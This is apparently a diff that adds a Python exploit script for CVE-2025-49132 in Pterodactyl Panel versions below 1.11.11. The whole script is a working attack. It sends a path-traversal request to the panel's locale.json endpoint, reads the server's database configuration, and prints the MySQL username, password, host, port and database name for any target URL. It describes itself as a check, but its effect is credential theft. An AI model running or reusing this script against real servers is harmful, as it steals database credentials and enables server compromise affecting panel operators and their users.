@@ -1,0 +1,48 @@
+# Exploit Title: Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)
+# Date: 22/06/2025
+# Exploit Author: Zen-kun04
+# Vendor Homepage: https://pterodactyl.io/
+# Software Link: https://github.com/pterodactyl/panel
+# Version: < 1.11.11
+# Tested on: Ubuntu 22.04.5 LTS
+# CVE: CVE-2025-49132
+
+
+import requests
+import json
+import argparse
+import colorama
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+arg_parser = argparse.ArgumentParser(
+    description="Check if the target is vulnerable to CVE-2025-49132.")
+arg_parser.add_argument("target", help="The target URL")
+args = arg_parser.parse_args()
+
+try:
+    target = args.target.strip() + '/' if not args.target.strip().endswith('/') else args.target.strip()
+    r = requests.get(f"{target}locales/locale.json?locale=../../../pterodactyl&namespace=config/database", allow_redirects=True, timeout=5, verify=False)
+    if r.status_code == 200 and "pterodactyl" in r.text.lower():
+        try:
+            raw_data = r.json()
+            data = {
+                "success": True,
+                "host": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("host", "N/A"),
+                "port": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("port", "N/A"),
+                "database": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("database", "N/A"),
+                "username": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("username", "N/A"),
+                "password": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("password", "N/A")
+            }
+            print(f"{colorama.Fore.LIGHTGREEN_EX}{target} => {data['username']}:{data['password']}@{data['host']}:{data['port']}/{data['database']}{colorama.Fore.RESET}")
+        except json.JSONDecodeError:
+            print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
+        except TypeError:
+            print(colorama.Fore.YELLOW + "Vulnerable but no database" + colorama.Fore.RESET)
+    else:
+        print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
+except requests.RequestException as e:
+    if "NameResolutionError" in str(e):
+        print(colorama.Fore.RED + "Invalid target or unable to resolve domain" + colorama.Fore.RESET)
+    else:
+        print(f"{colorama.Fore.RED}Request error: {e}{colorama.Fore.RESET}")
